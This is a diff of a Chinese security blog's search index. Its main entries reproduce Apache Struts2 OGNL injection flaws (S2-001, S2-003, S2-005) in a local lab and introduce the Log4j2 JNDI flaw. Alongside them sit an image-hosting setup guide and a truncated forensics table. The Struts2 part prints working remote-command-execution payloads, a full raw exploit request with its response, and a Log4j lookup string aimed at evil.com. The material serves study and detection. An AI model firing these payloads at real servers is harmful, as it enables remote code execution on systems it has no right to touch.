@@ -1,116 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>struts2框架漏洞</title>
-    <url>/posts/48203.html</url>
+    <title>Log4j2远程代码执行漏洞</title>
+    <url>/posts/33360.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
 
-<h2 id="前言知识"><a href="#前言知识" class="headerlink" title="前言知识"></a>前言知识</h2><h3 id="ognl表达式注入"><a href="#ognl表达式注入" class="headerlink" title="ognl表达式注入"></a>ognl表达式注入</h3><p>对象导航图语言，用于访问对象的字段、方法。基于简化访问java对象属性和调用方法需求，实现字段类型转化等功能；访问列表的元素：peoplelist[0]</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正常java代码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> MyUser.getName()</span><br><span class="line"><span class="comment">//表达式写法</span></span><br><span class="line">#MyUser.name</span><br></pre></td></tr></table></figure>
-
-<h4 id="对静态方法或变量的访问"><a href="#对静态方法或变量的访问" class="headerlink" title="对静态方法或变量的访问"></a>对静态方法或变量的访问</h4><ul>
-<li>java：类名.方法名</li>
-<li>ognl：@类名@方法名</li>
-</ul>
-<h4 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h4><p>后端写了一段程序：使用了ognl这个功能，getValue值可控，用户传入恶意表达式，导致漏洞</p>
-<p>%{value}将表达式值转换为字符串格式，在数据库查询参数的动态构造中非常有用</p>
-<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>在java中，方法的<strong>作用域</strong>指的是方法<strong>可以被访问的范围</strong>。</p>
-<ol>
-<li>Public：公共方法，可以被任何类访问</li>
-<li>Protected：受保护方法，可以被同一包内的类和该类的子类访问</li>
-<li>Default（package-private）：默认方法，只能被同一包内的类访问</li>
-<li>Private：私有方法，只能在定义该方法的类内部访问</li>
-</ol>
-<h4 id="使用Runtime时"><a href="#使用Runtime时" class="headerlink" title="使用Runtime时"></a>使用Runtime时</h4><p>为啥不用通过 new 这种形式来创建对象</p>
-<p>Runtime的类构造方法定义域时private–&gt;导致无法new一个新的对象出来</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616221736840-1006422143.png" alt="image-20240616221741744"></p>
-<p>那怎样获取Runtime的对象？<br><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616221521627-691059725.png" alt="image-20240616221526053"></p>
-<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>在java中，static关键字用于表示一个成员属于类本身，而不是某个对象</p>
-<ul>
-<li>无需创建类的实例即可被调用，可使用类名+方法名调用，例如ClassName.methodName()</li>
-<li>非静态成员依赖于对象实例；静态方法不依赖任何实例</li>
-</ul>
-<h4 id="如何去执行"><a href="#如何去执行" class="headerlink" title="如何去执行"></a>如何去执行</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br><span class="line">定义currentRuntime的私有静态变量，初始化为一个新的Runtime对象。然后，它提供了一个公共静态方法getRuntime()，该方法返回currentRuntime变量的值。</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616223223048-1053557580.png" alt="image-20240616223228152"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Runtime(); 不能用</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime(); 获取到Runtime对象</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用ognl表达式%{value}进行解析，然后重新填充到对应的表单数据中。</p>
-<p>例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>poc：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取tomcat执行路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">/usr/local/tomcat</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616224654112-1086478625.png" alt="image-20240616224658534"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">/usr/local/tomcat/webapps/ROOT/ </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616224906599-1489159828.png" alt="image-20240616224911469"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//执行任意命令</span><br><span class="line">new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616225503869-755811821.png" alt="image-20240616225506526"></p>
-<h3 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h3><p>ognl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，通过unicode编码（u2003）或8进制即可绕过安全限制，从而操纵服务器端上下文对象</p>
-<p>公布的poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /s2_war/index.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&amp;(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&amp;(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)&amp;(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&amp;(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&amp;(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&amp;(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&amp;(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&amp;(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&amp;(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla)) HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6</span><br><span class="line">Cookie: JSESSIONID=FC7DC2221FDB37EAE855C6E6A11E9CC1; _ga=GA1.1.267931382.1545202285</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
-<p>请求响应内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">Date: Mon, 24 Dec 2018 09:36:01 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uid=1234556(xxxx) gid=1603212982 groups=1603212982....</span><br></pre></td></tr></table></figure>
-
-<h3 id="S3-005"><a href="#S3-005" class="headerlink" title="S3-005"></a>S3-005</h3><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
-<ul>
-<li><p>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</p>
-</li>
-<li><p>S2-003后官方增加了安全模式（沙盒）</p>
-</li>
-<li><p>S2-005使用ognl表达式将沙盒关闭，继续使用代码</p>
-</li>
-</ul>
-<p>poc（无回显，空格用@代替）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616231743715-604972521.png" alt="image-20240616231748445"></p>
-<p>进入容器可以看到&#x2F;tmp下创建了success文件</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616231712456-1645109332.png" alt="image-20240616231717266"></p>
-<h1 id="struts2攻击特征有哪些"><a href="#struts2攻击特征有哪些" class="headerlink" title="struts2攻击特征有哪些"></a>struts2攻击特征有哪些</h1><p><strong>RCE试图传⼊的命令以及执⾏结果</strong> </p>
-<p><strong>参数伪造，试图传⼊OGNL表达式</strong></p>
-<h1 id="struts2的特征"><a href="#struts2的特征" class="headerlink" title="struts2的特征"></a>struts2的特征</h1><p><strong>.do .action后缀常会出现，.jsp也可能</strong></p>
-<p><strong>能够处理OGNL表达式</strong></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>log4j2漏洞是java应用常见开源日志库，使用极为广泛</p>
+<p>2.0-2.14.1存在JNDI注入漏洞，攻击者可以在控制日志内容的情况下，通过传入类似<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码</p>
+<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>应用程序设计的API，标准的JAVA命名接口。允许从指定的远程服务器获取加载对象，JNDI相当于映射的字典，使得java应用程序和这些命名服务与目录服务之间进行交互</p>
+<h3 id="log4j2基础开发学习"><a href="#log4j2基础开发学习" class="headerlink" title="log4j2基础开发学习"></a>log4j2基础开发学习</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240617112745274-1057914604.png" alt="image-20240617112744151"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>图床搭建(零成本)</title>
-    <url>/posts/afaa72b6.html</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>使用typora发布博客以及发送给朋友md文档需要打包成压缩包，csdn还无法解码url，</p>
-<p>于是搭建免费版github+pic图床，但github图床限制1G，超过就会有人工审核，并且传输不稳定，时好时坏</p>
-<p>七牛虽然高速，但免费时长只有一月，超过需要绑定域名，（域名便宜的大概12一年）</p>
-<p>阿里和腾讯都需要收费</p>
-<h3 id="1-创建博客园账号"><a href="#1-创建博客园账号" class="headerlink" title="1.创建博客园账号"></a>1.创建博客园账号</h3><p>软件exe基于博客园使用</p>
-<p>管理-设置-其他设置</p>
-<p>需要设置令牌</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609233056234-253989091.png" alt="image-20240609233055768"></p>
-<h3 id="2-下载exe"><a href="#2-下载exe" class="headerlink" title="2.下载exe"></a>2.下载exe</h3><p>注意：！！！安装路径不要带有中文路径</p>
-<p><a href="https://www.123pan.com/s/YiNWjv-b5fa3.html%E6%8F%90%E5%8F%96%E7%A0%81:48Oh">https://www.123pan.com/s/YiNWjv-b5fa3.html提取码:48Oh</a></p>
-<p>进行配置</p>
-<p>id是作者名称</p>
-<p>账号就是登录名</p>
-<p>密码就是令牌</p>
-<p>地址是metaweblog地址</p>
-<p>设置错误也没关系，按1重置，慢慢来就会成功</p>
-<h3 id="3-配置typora"><a href="#3-配置typora" class="headerlink" title="3.配置typora"></a>3.配置typora</h3><p>文件-偏好设置-图像</p>
-<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609233259076-2096031584.png" alt="image-20240609233258532"></p>
-<p>命令为.exe软件位置（再次提醒不要安装在中文路径）</p>
-<p>比如我的位置是D:\Tool\EasyBlogImageForTypora\EasyBlogImageForTypora.exe</p>
-<p>点击验证测试</p>
-<p>到此，免费图床就配置好了，祝各位前途无忧</p>
-]]></content>
-      <categories>
-        <category>博客配置</category>
       </categories>
   </entry>
   <entry>
@@ -246,6 +147,38 @@
       </categories>
   </entry>
   <entry>
+    <title>图床搭建(零成本)</title>
+    <url>/posts/afaa72b6.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>使用typora发布博客以及发送给朋友md文档需要打包成压缩包，csdn还无法解码url，</p>
+<p>于是搭建免费版github+pic图床，但github图床限制1G，超过就会有人工审核，并且传输不稳定，时好时坏</p>
+<p>七牛虽然高速，但免费时长只有一月，超过需要绑定域名，（域名便宜的大概12一年）</p>
+<p>阿里和腾讯都需要收费</p>
+<h3 id="1-创建博客园账号"><a href="#1-创建博客园账号" class="headerlink" title="1.创建博客园账号"></a>1.创建博客园账号</h3><p>软件exe基于博客园使用</p>
+<p>管理-设置-其他设置</p>
+<p>需要设置令牌</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609233056234-253989091.png" alt="image-20240609233055768"></p>
+<h3 id="2-下载exe"><a href="#2-下载exe" class="headerlink" title="2.下载exe"></a>2.下载exe</h3><p>注意：！！！安装路径不要带有中文路径</p>
+<p><a href="https://www.123pan.com/s/YiNWjv-b5fa3.html%E6%8F%90%E5%8F%96%E7%A0%81:48Oh">https://www.123pan.com/s/YiNWjv-b5fa3.html提取码:48Oh</a></p>
+<p>进行配置</p>
+<p>id是作者名称</p>
+<p>账号就是登录名</p>
+<p>密码就是令牌</p>
+<p>地址是metaweblog地址</p>
+<p>设置错误也没关系，按1重置，慢慢来就会成功</p>
+<h3 id="3-配置typora"><a href="#3-配置typora" class="headerlink" title="3.配置typora"></a>3.配置typora</h3><p>文件-偏好设置-图像</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609233259076-2096031584.png" alt="image-20240609233258532"></p>
+<p>命令为.exe软件位置（再次提醒不要安装在中文路径）</p>
+<p>比如我的位置是D:\Tool\EasyBlogImageForTypora\EasyBlogImageForTypora.exe</p>
+<p>点击验证测试</p>
+<p>到此，免费图床就配置好了，祝各位前途无忧</p>
+]]></content>
+      <categories>
+        <category>博客配置</category>
+      </categories>
+  </entry>
+  <entry>
     <title>旅游vlog</title>
     <url>/posts/e42dbe7e.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
@@ -304,6 +237,87 @@
 ]]></content>
       <categories>
         <category>生活</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>struts2框架漏洞</title>
+    <url>/posts/48203.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="前言知识"><a href="#前言知识" class="headerlink" title="前言知识"></a>前言知识</h2><h3 id="ognl表达式注入"><a href="#ognl表达式注入" class="headerlink" title="ognl表达式注入"></a>ognl表达式注入</h3><p>对象导航图语言，用于访问对象的字段、方法。基于简化访问java对象属性和调用方法需求，实现字段类型转化等功能；访问列表的元素：peoplelist[0]</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正常java代码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> MyUser.getName()</span><br><span class="line"><span class="comment">//表达式写法</span></span><br><span class="line">#MyUser.name</span><br></pre></td></tr></table></figure>
+
+<h4 id="对静态方法或变量的访问"><a href="#对静态方法或变量的访问" class="headerlink" title="对静态方法或变量的访问"></a>对静态方法或变量的访问</h4><ul>
+<li>java：类名.方法名</li>
+<li>ognl：@类名@方法名</li>
+</ul>
+<h4 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h4><p>后端写了一段程序：使用了ognl这个功能，getValue值可控，用户传入恶意表达式，导致漏洞</p>
+<p>%{value}将表达式值转换为字符串格式，在数据库查询参数的动态构造中非常有用</p>
+<h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h3><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>在java中，方法的<strong>作用域</strong>指的是方法<strong>可以被访问的范围</strong>。</p>
+<ol>
+<li>Public：公共方法，可以被任何类访问</li>
+<li>Protected：受保护方法，可以被同一包内的类和该类的子类访问</li>
+<li>Default（package-private）：默认方法，只能被同一包内的类访问</li>
+<li>Private：私有方法，只能在定义该方法的类内部访问</li>
+</ol>
+<h4 id="使用Runtime时"><a href="#使用Runtime时" class="headerlink" title="使用Runtime时"></a>使用Runtime时</h4><p>为啥不用通过 new 这种形式来创建对象</p>
+<p>Runtime的类构造方法定义域时private–&gt;导致无法new一个新的对象出来</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616221736840-1006422143.png" alt="image-20240616221741744"></p>
+<p>那怎样获取Runtime的对象？<br><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616221521627-691059725.png" alt="image-20240616221526053"></p>
+<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>在java中，static关键字用于表示一个成员属于类本身，而不是某个对象</p>
+<ul>
+<li>无需创建类的实例即可被调用，可使用类名+方法名调用，例如ClassName.methodName()</li>
+<li>非静态成员依赖于对象实例；静态方法不依赖任何实例</li>
+</ul>
+<h4 id="如何去执行"><a href="#如何去执行" class="headerlink" title="如何去执行"></a>如何去执行</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br><span class="line">定义currentRuntime的私有静态变量，初始化为一个新的Runtime对象。然后，它提供了一个公共静态方法getRuntime()，该方法返回currentRuntime变量的值。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616223223048-1053557580.png" alt="image-20240616223228152"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Runtime(); 不能用</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime(); 获取到Runtime对象</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用ognl表达式%{value}进行解析，然后重新填充到对应的表单数据中。</p>
+<p>例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取tomcat执行路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">/usr/local/tomcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616224654112-1086478625.png" alt="image-20240616224658534"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">/usr/local/tomcat/webapps/ROOT/ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616224906599-1489159828.png" alt="image-20240616224911469"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//执行任意命令</span><br><span class="line">new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616225503869-755811821.png" alt="image-20240616225506526"></p>
+<h3 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h3><p>ognl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，通过unicode编码（u2003）或8进制即可绕过安全限制，从而操纵服务器端上下文对象</p>
+<p>公布的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /s2_war/index.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)&amp;(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&amp;(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)&amp;(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)&amp;(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))&amp;(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))&amp;(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))&amp;(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))&amp;(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&amp;(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla)) HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6</span><br><span class="line">Cookie: JSESSIONID=FC7DC2221FDB37EAE855C6E6A11E9CC1; _ga=GA1.1.267931382.1545202285</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>请求响应内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Apache-Coyote/1.1</span><br><span class="line">Date: Mon, 24 Dec 2018 09:36:01 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uid=1234556(xxxx) gid=1603212982 groups=1603212982....</span><br></pre></td></tr></table></figure>
+
+<h3 id="S3-005"><a href="#S3-005" class="headerlink" title="S3-005"></a>S3-005</h3><p>XWork会将GET参数的键和值利用OGNL表达式解析成Java语句，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys </span><br><span class="line">//会被转化成</span><br><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;)  </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>触发漏洞就是利用了这个点，再配合OGNL的沙盒绕过方法，组成了S2-003。官方对003的修复方法是增加了安全模式（沙盒），S2-005在OGNL表达式中将安全模式关闭，又绕过了修复方法。整体过程如下：</p>
+<ul>
+<li><p>S2-003 使用<code>\u0023</code>绕过s2对<code>#</code>的防御</p>
+</li>
+<li><p>S2-003后官方增加了安全模式（沙盒）</p>
+</li>
+<li><p>S2-005使用ognl表达式将沙盒关闭，继续使用代码</p>
+</li>
+</ul>
+<p>poc（无回显，空格用@代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616231743715-604972521.png" alt="image-20240616231748445"></p>
+<p>进入容器可以看到&#x2F;tmp下创建了success文件</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240616231712456-1645109332.png" alt="image-20240616231717266"></p>
+<h1 id="struts2攻击特征有哪些"><a href="#struts2攻击特征有哪些" class="headerlink" title="struts2攻击特征有哪些"></a>struts2攻击特征有哪些</h1><p><strong>RCE试图传⼊的命令以及执⾏结果</strong> </p>
+<p><strong>参数伪造，试图传⼊OGNL表达式</strong></p>
+<h1 id="struts2的特征"><a href="#struts2的特征" class="headerlink" title="struts2的特征"></a>struts2的特征</h1><p><strong>.do .action后缀常会出现，.jsp也可能</strong></p>
+<p><strong>能够处理OGNL表达式</strong></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
       </categories>
   </entry>
   <entry>
@@ -692,6 +706,131 @@
 ]]></content>
       <categories>
         <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>数字取证</title>
+    <url>/posts/21993.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="任务三：数字文件取证"><a href="#任务三：数字文件取证" class="headerlink" title="任务三：数字文件取证"></a>任务三：数字文件取证</h2><table>
+<thead>
+<tr>
+<th align="center">证据编号</th>
+<th align="center">在取证镜像中的文件名</th>
+<th align="center">镜像中原文件Hash码（MD5，不区分大小写）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">evidence 1</td>
+<td align="center">eg2kx.jpg</td>
+<td align="center">85cdf73518b32a37f74c4bfa42d856a6</td>
+</tr>
+<tr>
+<td align="center">evidence 2</td>
+<td align="center">ZQOo2.zip</td>
+<td align="center">9e69763ec7dac69e2c5b07a5955a5868</td>
+</tr>
+<tr>
+<td align="center">evidence 3</td>
+<td align="center">p3qQ4.jpg</td>
+<td align="center">a9a18aecec905a7742042461595b4b5c</td>
+</tr>
+<tr>
+<td align="center">evidence 4</td>
+<td align="center">nsOh2.png</td>
